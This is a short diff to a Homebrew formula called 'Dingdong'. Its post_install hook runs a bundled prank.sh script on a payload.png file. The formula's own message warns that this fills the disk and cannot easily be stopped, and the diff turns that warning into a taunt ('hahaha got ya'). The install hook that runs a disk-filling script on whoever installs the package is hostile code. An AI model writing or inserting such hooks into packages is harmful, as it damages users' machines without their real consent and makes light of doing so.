@@ -11,7 +11,7 @@ class Dingdong < Formula
   end
 
   def post_install
-    ohai "⚠️  WARNING: This will run until disk is full and cannot be stopped easily!"
+    ohai "⚠️  WARNING: This will run until disk is full! hahaha hahaha got ya 👺 "
     system "#{bin}/prank.sh #{pkgshare}/payload.png"
   end
 end
